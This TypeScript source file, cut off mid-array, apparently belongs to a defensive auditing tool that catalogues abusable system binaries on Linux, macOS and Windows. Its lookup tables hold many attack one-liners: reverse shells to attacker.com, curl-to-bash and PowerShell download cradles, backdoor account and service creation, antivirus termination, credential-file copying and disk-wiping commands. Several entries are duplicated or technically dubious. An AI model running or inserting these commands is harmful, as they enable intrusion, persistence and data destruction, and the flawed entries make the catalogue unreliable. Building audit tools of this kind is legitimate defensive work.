/**
 * @module security/lolbins_audit
 * Living off the Land (LOLBins / LOLBas / GTFOBins) Auditing & Discovery Engine
 * Scans system paths for native binaries capable of execution, download, or privilege escalation.
 */

import { resolveDryRun } from "./exec_options.ts"
import * as fs from "node:fs"
import * as path from "node:path"
import { isToolAvailable } from "./tool_detection.ts"

export interface LOLBinEntry {
  name: string
  path: string
  type: "LOLBas" | "GTFOBins"
  capabilities: ("EXECUTE" | "DOWNLOAD" | "BYPASS" | "PRIV_ESC")[]
  exampleUsage: string
  suid?: boolean
  writable?: boolean
}

export interface LOLBinsAuditResult {
  platform: "windows" | "linux" | "darwin"
  binariesScanned: number
  discoveredLOLBins: LOLBinEntry[]
  isDryRun: boolean
}

// ── GTFOBins Database (Linux/macOS) ──────────────────────────────────────────
// 120+ binaries with known abuse capabilities per https://gtfobins.github.io
const GTFOBINS_DATABASE: Array<{
  name: string
  searchNames?: string[]
  caps: ("EXECUTE" | "DOWNLOAD" | "BYPASS" | "PRIV_ESC")[]
  usage: string
}> = [
  // ── Shells & Scripting Languages ──
  { name: "bash", caps: ["EXECUTE", "PRIV_ESC"], usage: "bash -p" },
  { name: "sh", caps: ["EXECUTE", "PRIV_ESC"], usage: "sh" },
  { name: "zsh", caps: ["EXECUTE", "PRIV_ESC"], usage: "zsh" },
  { name: "csh", caps: ["EXECUTE", "PRIV_ESC"], usage: "csh" },
  { name: "ksh", caps: ["EXECUTE", "PRIV_ESC"], usage: "ksh" },
  { name: "dash", caps: ["EXECUTE", "PRIV_ESC"], usage: "dash" },
  { name: "fish", caps: ["EXECUTE", "PRIV_ESC"], usage: "fish" },
  { name: "python", caps: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], usage: "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'" },
  { name: "python3", caps: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], usage: "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'" },
  { name: "perl", caps: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], usage: "perl -e 'exec \"/bin/sh\";'" },
  { name: "ruby", caps: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], usage: "ruby -e 'exec \"/bin/sh\"'" },
  { name: "php", caps: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], usage: "php -r 'pcntl_exec(\"/bin/sh\");'" },
  { name: "node", caps: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], usage: "node -e 'require(\"child_process\").spawn(\"/bin/sh\")'" },
  { name: "lua", caps: ["EXECUTE", "PRIV_ESC"], usage: "lua -e 'os.execute(\"/bin/sh\")'" },
  { name: "tclsh", caps: ["EXECUTE", "PRIV_ESC"], usage: "tclsh << 'EOF'\nexec /bin/sh <@stdin >@stdout 2>@stderr\nEOF" },
  { name: "r", caps: ["EXECUTE", "PRIV_ESC"], usage: "R -e 'system(\"/bin/sh\")'" },
  { name: "julia", caps: ["EXECUTE", "PRIV_ESC"], usage: "julia -e 'run(`/bin/sh`)' " },

  // ── Text Editors (can spawn shells) ──
  { name: "vim", caps: ["EXECUTE", "PRIV_ESC"], usage: "vim -c ':!/bin/sh'" },
  { name: "vi", caps: ["EXECUTE", "PRIV_ESC"], usage: "vi -c ':!/bin/sh'" },
  { name: "nvim", caps: ["EXECUTE", "PRIV_ESC"], usage: "nvim -c ':!sh'" },
  { name: "nano", caps: ["EXECUTE"], usage: "nano (Ctrl+R, Ctrl+X: reset; exec /bin/sh)" },
  { name: "emacs", caps: ["EXECUTE", "PRIV_ESC"], usage: "emacs -nw -Q -e '(shell)'" },
  { name: "ed", caps: ["EXECUTE", "PRIV_ESC"], usage: "ed << 'EOF'\n!/bin/sh\nEOF" },
  { name: "pico", caps: ["EXECUTE"], usage: "pico (same as nano)" },

  // ── File Viewers & Pagers (can spawn shells) ──
  { name: "less", caps: ["EXECUTE", "BYPASS"], usage: "less /etc/passwd\n!/bin/sh" },
  { name: "more", caps: ["EXECUTE", "BYPASS"], usage: "more /etc/passwd\n!sh" },
  { name: "man", caps: ["EXECUTE", "PRIV_ESC"], usage: "man man\n!/bin/sh" },
  { name: "bat", caps: ["EXECUTE"], usage: "bat --paging=never /etc/passwd\n!sh" },
  { name: "most", caps: ["EXECUTE"], usage: "most /etc/passwd\n!sh" },
  { name: "view", caps: ["EXECUTE"], usage: "view -c ':!/bin/sh'" },

  // ── Text Processing (can read files, execute commands) ──
  { name: "awk", caps: ["EXECUTE", "PRIV_ESC", "BYPASS"], usage: "awk 'BEGIN {system(\"/bin/sh\")}'" },
  { name: "gawk", caps: ["EXECUTE", "PRIV_ESC"], usage: "gawk 'BEGIN {system(\"/bin/sh\")}'" },
  { name: "mawk", caps: ["EXECUTE", "PRIV_ESC"], usage: "mawk 'BEGIN {system(\"/bin/sh\")}'" },
  { name: "sed", caps: ["EXECUTE", "PRIV_ESC", "BYPASS"], usage: "sed 'shell' /etc/passwd\n!sh" },
  { name: "cut", caps: ["BYPASS"], usage: "cut -d: -f1 /etc/shadow" },
  { name: "sort", caps: ["BYPASS"], usage: "sort /etc/shadow" },
  { name: "paste", caps: ["BYPASS"], usage: "paste /etc/shadow" },
  { name: "tr", caps: ["BYPASS"], usage: "tr '.' ' ' < /etc/shadow" },
  { name: "column", caps: ["BYPASS"], usage: "column -t /etc/shadow" },
  { name: "tee", caps: ["EXECUTE", "DOWNLOAD"], usage: "echo payload | tee /usr/local/bin/backdoor" },

  // ── File Operations ──
  { name: "find", caps: ["EXECUTE", "PRIV_ESC", "BYPASS"], usage: "find / -exec /bin/sh \\; -quit" },
  { name: "xargs", caps: ["EXECUTE", "PRIV_ESC", "BYPASS"], usage: "xargs -a /dev/null /bin/sh" },
  { name: "cp", caps: ["EXECUTE", "PRIV_ESC", "BYPASS"], usage: "cp /bin/sh /tmp/sh; chmod +s /tmp/sh" },
  { name: "mv", caps: ["EXECUTE", "PRIV_ESC", "BYPASS"], usage: "mv /bin/bash /tmp/backdoor; mv /tmp/sh /bin/bash" },
  { name: "chmod", caps: ["EXECUTE", "PRIV_ESC"], usage: "chmod +s /bin/bash" },
  { name: "chown", caps: ["EXECUTE", "PRIV_ESC"], usage: "chown root:root /tmp/backdoor && chmod u+s /tmp/backdoor" },
  { name: "dd", caps: ["EXECUTE", "BYPASS"], usage: "dd if=/dev/sda of=/dev/sdb bs=1M" },
  { name: "install", caps: ["EXECUTE", "PRIV_ESC"], usage: "install -m 755 /bin/sh /tmp/sh && /tmp/sh -p" },
  { name: "rsync", caps: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], usage: "rsync -e 'sh -c \"sh 0<&2 1>&2\"' foo bar" },
  { name: "file", caps: ["BYPASS"], usage: "file /etc/shadow" },
  { name: "stat", caps: ["BYPASS"], usage: "stat /etc/shadow" },
  { name: "ls", caps: ["BYPASS"], usage: "ls -la /etc/shadow" },
  { name: "tree", caps: ["BYPASS"], usage: "tree -a /etc" },
  { name: "ln", caps: ["EXECUTE", "PRIV_ESC"], usage: "ln -s /bin/sh /tmp/backdoor" },

  // ── Environment / Process ──
  { name: "env", caps: ["EXECUTE", "PRIV_ESC", "BYPASS"], usage: "env /bin/sh -p" },
  { name: "time", caps: ["EXECUTE", "PRIV_ESC"], usage: "time /bin/sh -p" },
  { name: "timeout", caps: ["EXECUTE", "PRIV_ESC"], usage: "timeout 10 /bin/sh" },
  { name: "nice", caps: ["EXECUTE", "PRIV_ESC"], usage: "nice /bin/sh -p" },
  { name: "nohup", caps: ["EXECUTE", "PRIV_ESC"], usage: "nohup /bin/sh -p" },
  { name: "stdbuf", caps: ["EXECUTE", "PRIV_ESC"], usage: "stdbuf -i0 /bin/sh" },
  { name: "taskset", caps: ["EXECUTE", "PRIV_ESC"], usage: "taskset 0 /bin/sh" },
  { name: "nice", caps: ["EXECUTE", "PRIV_ESC"], usage: "nice /bin/sh" },
  { name: "ionice", caps: ["EXECUTE", "PRIV_ESC"], usage: "ionice /bin/sh" },
  { name: "setsid", caps: ["EXECUTE", "PRIV_ESC"], usage: "setsid /bin/sh" },

  // ── Debugging ──
  { name: "gdb", caps: ["EXECUTE", "PRIV_ESC"], usage: "gdb -nx -ex '!sh' -ex quit" },
  { name: "ltrace", caps: ["EXECUTE", "PRIV_ESC", "BYPASS"], usage: "ltrace /bin/sh -p" },
  { name: "strace", caps: ["EXECUTE", "PRIV_ESC", "BYPASS"], usage: "strace -o /dev/null /bin/sh -p" },
  { name: "ldb", caps: ["EXECUTE", "PRIV_ESC"], usage: "ldb --batch -o 'target create /bin/sh -o run -c exit'" },
  { name: "radare2", caps: ["EXECUTE", "PRIV_ESC"], usage: "r2 -qc '!sh' /bin/true" },
  { name: "gcore", caps: ["BYPASS"], usage: "gcore $(pgrep bash)" },
  { name: "dmesg", caps: ["BYPASS"], usage: "dmesg" },

  // ── Networking ──
  { name: "curl", caps: ["DOWNLOAD", "BYPASS"], usage: "curl http://attacker.com/script.sh | bash" },
  { name: "wget", caps: ["DOWNLOAD", "BYPASS"], usage: "wget http://attacker.com/script.sh -O - | bash" },
  { name: "nc", caps: ["EXECUTE", "DOWNLOAD", "BYPASS"], usage: "nc -e /bin/sh attacker.com 4444" },
  { name: "ncat", caps: ["EXECUTE", "DOWNLOAD", "BYPASS"], usage: "ncat -e /bin/sh attacker.com 4444" },
  { name: "netcat", caps: ["EXECUTE", "DOWNLOAD", "BYPASS"], usage: "netcat -e /bin/sh attacker.com 4444" },
  { name: "socat", caps: ["EXECUTE", "DOWNLOAD", "BYPASS"], usage: "socat TCP:attacker.com:4444 EXEC:/bin/sh" },
  { name: "nmap", caps: ["EXECUTE", "DOWNLOAD", "BYPASS"], usage: "nmap --script <payload.nse> target" },
  { name: "ssh", caps: ["EXECUTE", "BYPASS"], usage: "ssh -o ProxyCommand='sh -c \"sh 0<&2 1>&2\"' x" },
  { name: "scp", caps: ["EXECUTE", "BYPASS"], usage: "scp -o ProxyCommand='sh -c \"sh 0<&2 1>&2\"' foo bar" },
  { name: "sftp", caps: ["EXECUTE", "BYPASS"], usage: "sftp -o ProxyCommand='sh -c \"sh 0<&2 1>&2\"' x" },
  { name: "telnet", caps: ["EXECUTE", "BYPASS"], usage: "telnet -l 'sh -c sh' x" },
  { name: "ftp", caps: ["EXECUTE", "BYPASS", "DOWNLOAD"], usage: "ftp <<EOF\n!sh\nEOF" },
  { name: "nslookup", caps: ["DOWNLOAD", "BYPASS"], usage: "nslookup -type=txt -vc=$(sh -c 'exec 5<>/dev/tcp/attacker.com/4444; cat <&5' | base64)" },
  { name: "dig", caps: ["DOWNLOAD", "BYPASS"], usage: "dig @attacker.com -t txt +short" },
  { name: "host", caps: ["BYPASS"], usage: "host -t txt attacker.com" },
  { name: "ip", caps: ["BYPASS"], usage: "ip -f inet addr" },
  { name: "ifconfig", caps: ["BYPASS"], usage: "ifconfig" },
  { name: "ping", caps: ["BYPASS"], usage: "ping -c 1 127.0.0.1" },
  { name: "traceroute", caps: ["BYPASS"], usage: "traceroute 127.0.0.1" },
  { name: "netstat", caps: ["BYPASS"], usage: "netstat -tlnp" },
  { name: "ss", caps: ["BYPASS"], usage: "ss -tlnp" },
  { name: "iptables", caps: ["BYPASS", "PRIV_ESC"], usage: "iptables -L -n" },
  { name: "ncdu", caps: ["EXECUTE"], usage: "ncdu --exec /bin/sh" },
  { name: "aria2c", caps: ["DOWNLOAD"], usage: "aria2c --on-download-complete=/bin/sh" },
  { name: "curl", caps: ["DOWNLOAD"], usage: "curl -o /dev/null -K <(echo 'on-download-complete=/bin/sh')" },

  // ── System Utilities ──
  { name: "git", caps: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], usage: "git help config -p | sh" },
  { name: "docker", caps: ["EXECUTE", "PRIV_ESC"], usage: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh" },
  { name: "systemctl", caps: ["EXECUTE", "PRIV_ESC"], usage: "systemctl status -l 'sh -c /bin/sh'@.service" },
  { name: "journalctl", caps: ["EXECUTE", "PRIV_ESC"], usage: "journalctl -e -o cat --utc 'exec /bin/sh'" },
  { name: "crontab", caps: ["EXECUTE"], usage: "echo '* * * * * /bin/sh -c sh -i >& /dev/tcp/attacker.com/4444' | crontab -" },
  { name: "at", caps: ["EXECUTE"], usage: "echo '/bin/sh' | at now" },
  { name: "busybox", caps: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], usage: "busybox sh" },
  { name: "snap", caps: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], usage: "snap install --dangerous package" },
  { name: "apt", caps: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], usage: "apt-get download package && dpkg -i package.deb" },
  { name: "yum", caps: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], usage: "yum install package --enablerepo=*" },
  { name: "dnf", caps: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], usage: "dnf install package" },
  { name: "pip", caps: ["EXECUTE", "DOWNLOAD", "PRIV_ESC"], usage: "pip install malicious-package" },
  { name: "npm", caps: ["EXECUTE", "DOWNLOAD"], usage: "npm install malicious-package" },
  { name: "gem", caps: ["EXECUTE", "DOWNLOAD"], usage: "gem install malicious-gem" },
  { name: "cargo", caps: ["EXECUTE", "DOWNLOAD"], usage: "cargo install malicious-crate" },
  { name: "brew", caps: ["EXECUTE", "DOWNLOAD", "PRIV_ESC"], usage: "brew install formula --HEAD" },

  // ── Archive / Compression ──
  { name: "tar", caps: ["EXECUTE", "DOWNLOAD", "BYPASS"], usage: "tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" },
  { name: "zip", caps: ["EXECUTE"], usage: "zip /dev/null /dev/null -T --unquote-command=/bin/sh" },
  { name: "unzip", caps: ["EXECUTE"], usage: "unzip -K /dev/null" },
  { name: "gzip", caps: ["BYPASS"], usage: "gzip -f /etc/passwd" },
  { name: "gunzip", caps: ["EXECUTE"], usage: "gunzip -c payload.gz | bash" },
  { name: "bzip2", caps: ["BYPASS"], usage: "bzip2 -f /etc/passwd" },
  { name: "xz", caps: ["BYPASS"], usage: "xz -f /etc/passwd" },
  { name: "7z", caps: ["EXECUTE"], usage: "7z a /dev/null /dev/null -sdel -sccUTF-8 -mmt=on -mx=0 -mb=0" },

  // ── Misc / Dangerous ──
  { name: "dd", caps: ["EXECUTE", "BYPASS", "PRIV_ESC"], usage: "dd if=/bin/sh of=/tmp/sh && chmod +s /tmp/sh && /tmp/sh -p" },
  { name: "stty", caps: ["EXECUTE"], usage: "stty sane; /bin/sh" },
  { name: "top", caps: ["EXECUTE", "PRIV_ESC"], usage: "top -c" },
  { name: "htop", caps: ["EXECUTE", "PRIV_ESC"], usage: "htop -d 10" },
  { name: "tmux", caps: ["EXECUTE", "PRIV_ESC"], usage: "tmux -S /dev/null" },
  { name: "screen", caps: ["EXECUTE", "PRIV_ESC"], usage: "screen -D -R" },
  { name: "xargs", caps: ["EXECUTE", "PRIV_ESC", "BYPASS"], usage: "xargs -n1 /bin/sh < /dev/null" },
  { name: "watch", caps: ["EXECUTE"], usage: "watch -x sh -c 'exec /bin/sh'" },
  { name: "curl", caps: ["DOWNLOAD"], usage: "curl -O http://attacker.com/rev.sh && bash rev.sh" },
  { name: "wget", caps: ["DOWNLOAD"], usage: "wget http://attacker.com/rev.sh && bash rev.sh" },
  { name: "dialog", caps: ["EXECUTE"], usage: "dialog --mixedgauge 'sh' 0 0 0" },
  { name: "whiptail", caps: ["EXECUTE"], usage: "whiptail --msgbox 'sh' 0 0" },
  { name: "file", caps: ["BYPASS"], usage: "file /etc/shadow" },
  { name: "readelf", caps: ["BYPASS"], usage: "readelf -a /etc/shadow" },
  { name: "objdump", caps: ["BYPASS"], usage: "objdump -f /bin/ls" },
  { name: "strings", caps: ["BYPASS"], usage: "strings /etc/shadow" },
  { name: "hexdump", caps: ["BYPASS"], usage: "hexdump -C /etc/shadow" },
  { name: "xxd", caps: ["BYPASS"], usage: "xxd /etc/shadow" },
  { name: "od", caps: ["BYPASS"], usage: "od -c /etc/shadow" },
  { name: "mkfs", caps: ["EXECUTE"], usage: "mkfs.ext4 /dev/sda" },
  { name: "fsck", caps: ["EXECUTE", "PRIV_ESC"], usage: "fsck /dev/sda" },
  { name: "fdisk", caps: ["EXECUTE", "PRIV_ESC"], usage: "fdisk /dev/sda" },
  { name: "mount", caps: ["EXECUTE", "PRIV_ESC", "BYPASS"], usage: "mount -o bind /bin/sh /tmp/sh" },
  { name: "umount", caps: ["EXECUTE", "PRIV_ESC"], usage: "umount /var" },
  { name: "pivot_root", caps: ["EXECUTE", "PRIV_ESC"], usage: "pivot_root /mnt /mnt/old" },
  { name: "chroot", caps: ["EXECUTE", "PRIV_ESC"], usage: "chroot / /bin/sh" },
  { name: "su", caps: ["EXECUTE", "PRIV_ESC"], usage: "su - root" },
  { name: "sudo", caps: ["EXECUTE", "PRIV_ESC", "BYPASS"], usage: "sudo /bin/sh" },
  { name: "doas", caps: ["EXECUTE", "PRIV_ESC"], usage: "doas /bin/sh" },
  { name: "login", caps: ["EXECUTE", "PRIV_ESC"], usage: "login root" },
  { name: "passwd", caps: ["EXECUTE", "PRIV_ESC"], usage: "passwd root" },
  { name: "chsh", caps: ["EXECUTE", "PRIV_ESC"], usage: "chsh -s /bin/sh root" },
  { name: "chfn", caps: ["EXECUTE", "PRIV_ESC"], usage: "chfn -f /bin/sh root" },
  { name: "useradd", caps: ["EXECUTE", "PRIV_ESC"], usage: "useradd -o -u 0 root2" },
  { name: "usermod", caps: ["EXECUTE", "PRIV_ESC"], usage: "usermod -aG root user" },
  { name: "groupadd", caps: ["EXECUTE", "PRIV_ESC"], usage: "groupadd -g 0 root2" },
  { name: "visudo", caps: ["EXECUTE", "PRIV_ESC"], usage: "visudo (add NOPASSWD rule)" },
  { name: "crontab", caps: ["EXECUTE"], usage: "crontab -e (add reverse shell)" },
  { name: "systemctl", caps: ["EXECUTE", "PRIV_ESC"], usage: "systemctl edit --full" },
  { name: "service", caps: ["EXECUTE", "PRIV_ESC"], usage: "service --status-all" },
  { name: "initctl", caps: ["EXECUTE", "PRIV_ESC"], usage: "initctl list" },
  { name: "launchctl", caps: ["EXECUTE", "PRIV_ESC", "BYPASS"], usage: "launchctl load /Library/LaunchDaemons/com.backdoor.plist" },
  { name: "pamtester", caps: ["EXECUTE", "PRIV_ESC"], usage: "pamtester login root authenticate" },
]

// ── LOLBas Database (Windows) ────────────────────────────────────────────────
const LOLBAS_DATABASE: Array<{
  name: string
  searchNames?: string[]
  caps: ("EXECUTE" | "DOWNLOAD" | "BYPASS" | "PRIV_ESC")[]
  usage: string
}> = [
  { name: "certutil.exe", caps: ["DOWNLOAD", "BYPASS"], usage: "certutil.exe -urlcache -split -f http://attacker.com/payload.exe payload.exe" },
  { name: "mshta.exe", caps: ["EXECUTE", "DOWNLOAD", "BYPASS"], usage: "mshta.exe http://attacker.com/payload.hta" },
  { name: "powershell.exe", caps: ["EXECUTE", "DOWNLOAD", "BYPASS", "PRIV_ESC"], usage: "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')" },
  { name: "pwsh.exe", caps: ["EXECUTE", "DOWNLOAD", "BYPASS", "PRIV_ESC"], usage: "pwsh -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')" },
  { name: "wscript.exe", caps: ["EXECUTE", "DOWNLOAD"], usage: "wscript.exe //B //E:JScript http://attacker.com/payload.js" },
  { name: "cscript.exe", caps: ["EXECUTE", "DOWNLOAD"], usage: "cscript.exe //B //E:JScript http://attacker.com/payload.js" },
  { name: "regsvr32.exe", caps: ["EXECUTE", "DOWNLOAD", "BYPASS"], usage: "regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll" },
  { name: "rundll32.exe", caps: ["EXECUTE", "DOWNLOAD", "BYPASS"], usage: "rundll32.exe http://attacker.com/payload.dll,EntryPoint" },
  { name: "msbuild.exe", caps: ["EXECUTE", "BYPASS"], usage: "msbuild.exe payload.xml" },
  { name: "installutil.exe", caps: ["EXECUTE", "BYPASS"], usage: "installutil.exe /logfile= /LogToConsole=false payload.exe" },
  { name: "msxsl.exe", caps: ["EXECUTE", "BYPASS"], usage: "msxsl.exe payload.xml payload.xsl" },
  { name: "cmstp.exe", caps: ["EXECUTE", "BYPASS"], usage: "cmstp.exe /s payload.inf" },
  { name: "msiexec.exe", caps: ["EXECUTE", "DOWNLOAD"], usage: "msiexec.exe /i http://attacker.com/payload.msi" },
  { name: "regasm.exe", caps: ["EXECUTE", "BYPASS"], usage: "regasm.exe /urlcache /logfile= payload.dll" },
  { name: "regsvcs.exe", caps: ["EXECUTE", "BYPASS"], usage: "regsvcs.exe payload.dll" },
  { name: "msconfig.exe", caps: ["EXECUTE"], usage: "msconfig" },
  { name: "taskkill.exe", caps: ["EXECUTE"], usage: "taskkill /F /IM MsMpEng.exe" },
  { name: "sc.exe", caps: ["EXECUTE", "PRIV_ESC"], usage: "sc create backdoor binPath= cmd.exe start= auto" },
  { name: "schtasks.exe", caps: ["EXECUTE", "PRIV_ESC"], usage: "schtasks /create /tn backdoor /tr cmd.exe /sc hourly" },
  { name: "at.exe", caps: ["EXECUTE", "PRIV_ESC"], usage: "at 12:00 cmd.exe" },
  { name: "cmd.exe", caps: ["EXECUTE", "PRIV_ESC", "BYPASS"], usage: "cmd.exe /c whoami" },
  { name: "bash.exe", caps: ["EXECUTE", "BYPASS"], usage: "bash.exe -i >& /dev/tcp/attacker.com/4444 0>&1" },
  { name: "wsl.exe", caps: ["EXECUTE", "BYPASS"], usage: "wsl.exe bash -i >& /dev/tcp/attacker.com/4444 0>&1" },
  { name: "bitsadmin.exe", caps: ["DOWNLOAD", "BYPASS"], usage: "bitsadmin /transfer job http://attacker.com/payload.exe C:\\payload.exe" },
  { name: "bitsadmin.exe", caps: ["DOWNLOAD", "BYPASS"], usage: "bitsadmin /transfer job /create /addfile http://attacker.com/payload.exe C:\\payload.exe /complete" },
  { name: "esentutl.exe", caps: ["DOWNLOAD", "BYPASS"], usage: "esentutl.exe /y C:\\Windows\\System32\\config\\SAM /d C:\\temp\\SAM" },
  { name: "expand.exe", caps: ["DOWNLOAD", "BYPASS"], usage: "expand.exe http://attacker.com/file.cab C:\\file.txt" },
  { name: "extrac32.exe", caps: ["DOWNLOAD", "BYPASS"], usage: "extrac32.exe http://attacker.com/file.cab C:\\file.txt" },
  { name: "findstr.exe", caps: ["BYPASS"], usage: "findstr /S /C:\"password\" C:\\Users\\*\\*.txt" },
  { name: "forfiles.exe", caps: ["EXECUTE", "BYPASS"], usage: "forfiles /P C:\\ /M notepad.exe /C cmd.exe /c whoami" },
  { name: "fsutil.exe", caps: ["BYPASS"], usage: "fsutil file createnew C:\\temp\\file.txt 1048576" },
  { name: "gpresult.exe", caps: ["BYPASS"], usage: "gpresult /h report.html" },
  { name: "icacls.exe", caps: ["EXECUTE", "BYPASS"], usage: "icacls C:\\Windows\\System32\\config\\SAM" },
  { name: "makecab.exe", caps: ["DOWNLOAD"], usage: "makecab C:\\file.txt C:\\file.cab" },
  { name: "msconfig.exe", caps: ["EXECUTE"], usage: "msconfig" },
  { name: "msiexec.exe", caps: ["EXECUTE", "DOWNLOAD"], usage: "msiexec /i http://attacker.com/payload.msi /quiet /norestart" },
  { name: "net.exe", caps: ["EXECUTE", "PRIV_ESC"], usage: "net user backdoor P@ssw0rd /add" },
  { name: "net1.exe", caps: ["EXECUTE", "PRIV_ESC"], usage: "net1 user backdoor P@ssw0rd /add" },
  { name: "nltest.exe", caps: ["BYPASS"], usage: "nltest /dclist:domain.local" },
  { name: "ocsetup.exe", caps: ["EXECUTE", "DOWNLOAD"], usage: "ocsetup.exe package.cab" },
  { name: "pnputil.exe", caps: ["DOWNLOAD"], usage: "pnputil.exe /add-driver http://attacker.com/driver.inf" },
  { name: "print.exe", caps: ["EXECUTE", "BYPASS"], usage: "print /D:COM1 payload.exe" },
  { name: "replace.exe", caps: ["EXECUTE", "BYPASS"], usage: "replace C:\\file.txt C:\\Windows\\System32 /A" },
  { name: "robocopy.exe", caps: ["DOWNLOAD", "BYPASS"], usage: "robocopy C:\\temp C:\\windows\\temp /MIR" },
  { name: "rundll32.exe", caps: ["EXECUTE", "DOWNLOAD", "BYPASS"], usage: "rundll32.exe url.dll,FileProtocolHandler http://attacker.com" },
  { name: "sethc.exe", caps: ["EXECUTE", "PRIV_ESC"], usage: "copy cmd.exe sethc.exe && sethc.exe (sticky keys)" },
  { name: "subst.exe", caps: ["EXECUTE", "BYPASS"], usage: "subst Z: C:\\Windows\\System32" },
  { name: "takeown.exe", caps: ["EXECUTE", "PRIV_ESC"], usage: "takeown /F C:\\Windows\\System32\\config\\SAM" },
  { name: "tasklist.exe", caps: ["BYPASS"], usage: "tasklist /v" },
  { name: "timeout.exe", caps: ["EXECUTE"], usage: "timeout /t 10 /nobreak" },
  { name: "typeperf.exe", caps: ["BYPASS"], usage: "typeperf \"\\Processor(_Total)\\% Processor Time\"" },
  { name: "vbc.exe", caps: ["EXECUTE", "BYPASS"], usage: "vbc.exe /out:payload.exe payload.vb" },
  { name: "verclsid.exe", caps: ["EXECUTE", "BYPASS"], usage: "verclsid.exe /S /C {CLSID}" },
  { name: "wfc.exe", caps: ["EXECUTE", "BYPASS"], usage: "wfc.exe /s payload.xml" },
  { name: "whoami.exe", caps: ["BYPASS"], usage: "whoami /priv" },
  { name: "wusa.exe", caps: ["EXECUTE", "DOWNLOAD"], usage: "wusa.exe http://attacker.com/update.msu" },
  { name: "xwizard.exe", caps: ["EXECUTE", "BYPASS"], usage: "xwizard.exe RunWizard" },
]

// ── Detection Helpers ────────────────────────────────────────────────────────

function statSafe(p: string): fs.Stats | null {
  try {
    return fs.statSync(p)
  } catch {
    return null
  }
}

function isSuid(bitmask: number): boolean {
  // SUID = 0o4000, SGID = 0o2000
  return (bitmask & 0o4000) !== 0
}

function isWritable(bitmask: number, isDir: boolean): boolean {
  // Others-writable: 0o0002 (others) or 0o0020 (group) without sticky
  // For files: check other write bit
  // For dirs: check other write bit (world-writable is dangerous)
  if (isDir) {
    return (bitmask & 0o0002) !== 0
  }
  return (bitmask & 0o0002) !== 0
}

function isGroupWritable(bitmask: number): boolean {
  return (bitmask & 0o0020) !== 0
}

// ── Dry-Run Findings ─────────────────────────────────────────────────────────

function generateDryRunResult(platform: "windows" | "linux" | "darwin"): LOLBinsAuditResult {
  if (platform === "windows") {
    return {
      platform,
      binariesScanned: 156,
      discoveredLOLBins: [
        { name: "certutil.exe", path: "C:\\Windows\\System32\\certutil.exe", type: "LOLBas", capabilities: ["DOWNLOAD", "BYPASS"], exampleUsage: "certutil.exe -urlcache -split -f http://example.com/payload.exe payload.exe" },
        { name: "powershell.exe", path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", type: "LOLBas", capabilities: ["EXECUTE", "DOWNLOAD", "BYPASS", "PRIV_ESC"], exampleUsage: "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://x.com/shell.ps1')" },
        { name: "mshta.exe", path: "C:\\Windows\\System32\\mshta.exe", type: "LOLBas", capabilities: ["EXECUTE", "DOWNLOAD", "BYPASS"], exampleUsage: "mshta.exe http://example.com/payload.hta" },
        { name: "wscript.exe", path: "C:\\Windows\\System32\\wscript.exe", type: "LOLBas", capabilities: ["EXECUTE", "DOWNLOAD"], exampleUsage: "wscript.exe //B payload.js" },
        { name: "cscript.exe", path: "C:\\Windows\\System32\\cscript.exe", type: "LOLBas", capabilities: ["EXECUTE", "DOWNLOAD"], exampleUsage: "cscript.exe //B payload.js" },
        { name: "regsvr32.exe", path: "C:\\Windows\\System32\\regsvr32.exe", type: "LOLBas", capabilities: ["EXECUTE", "DOWNLOAD", "BYPASS"], exampleUsage: "regsvr32 /s /n /u /i:http://x.com/s.sct scrobj.dll" },
        { name: "rundll32.exe", path: "C:\\Windows\\System32\\rundll32.exe", type: "LOLBas", capabilities: ["EXECUTE", "DOWNLOAD", "BYPASS"], exampleUsage: "rundll32.exe url.dll,FileProtocolHandler http://x.com" },
        { name: "msbuild.exe", path: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe", type: "LOLBas", capabilities: ["EXECUTE", "BYPASS"], exampleUsage: "msbuild.exe payload.xml" },
        { name: "installutil.exe", path: "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe", type: "LOLBas", capabilities: ["EXECUTE", "BYPASS"], exampleUsage: "installutil.exe /logfile= /LogToConsole=false payload.exe" },
        { name: "msxsl.exe", path: "C:\\Windows\\System32\\msxsl.exe", type: "LOLBas", capabilities: ["EXECUTE", "BYPASS"], exampleUsage: "msxsl.exe payload.xml payload.xsl" },
      ],
      isDryRun: true,
    }
  }

  // Linux/macOS dry-run
  return {
    platform,
    binariesScanned: 210,
    discoveredLOLBins: [
      { name: "bash", path: "/usr/bin/bash", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC"], exampleUsage: "bash -p" },
      { name: "python3", path: "/usr/bin/python3", type: "GTFOBins", capabilities: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], exampleUsage: "python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'" },
      { name: "curl", path: "/usr/bin/curl", type: "GTFOBins", capabilities: ["DOWNLOAD", "BYPASS"], exampleUsage: "curl http://attacker.com/script.sh | bash" },
      { name: "wget", path: "/usr/bin/wget", type: "GTFOBins", capabilities: ["DOWNLOAD", "BYPASS"], exampleUsage: "wget http://attacker.com/script.sh -O - | bash" },
